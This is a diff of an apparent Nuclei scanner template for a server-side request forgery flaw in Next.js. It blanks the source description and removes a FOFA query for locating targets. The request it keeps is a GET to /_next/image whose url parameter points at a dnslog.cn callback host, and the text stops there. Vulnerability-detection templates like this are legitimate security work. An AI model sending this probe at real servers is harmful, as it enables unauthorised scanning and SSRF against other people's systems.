@@ -3,12 +3,8 @@ info:
   name: Next.Js存在 SSRF 漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgnqk604xyhtiryo'
+  description: ''
   tags: ssrf,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wgnqk604xyhtiryo
-    fofa: body="/_next/static"
 http:
 - raw:
   - 'GET /_next/image?w=16&q=10&url=http://123.6nhqkn.dnslog.cn HTTP/1.1
